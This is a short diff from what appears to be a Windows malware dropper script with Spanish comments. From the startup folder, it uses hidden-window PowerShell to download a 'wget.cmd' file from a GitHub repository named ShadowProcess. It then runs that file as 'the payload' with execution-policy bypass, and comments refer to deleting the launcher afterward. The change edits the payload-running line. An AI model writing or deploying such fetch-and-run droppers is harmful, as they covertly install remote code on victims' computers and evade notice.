@@ -14,7 +14,7 @@ cd  %STARTUP%
 powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/tobiasasa/ShadowProcess/main/files/wget.cmd -OutFile wget.cmd"
 
 @REM Corriendo el payload
-powershell -windowstyle hidden -ep bypass ./wget.cmd
+powershell powershell.exe -windowstyle hidden -ep bypass ./wget.cmd
 
 @REM Borramos el iniciador
 @REM cd %INITIALPATH%
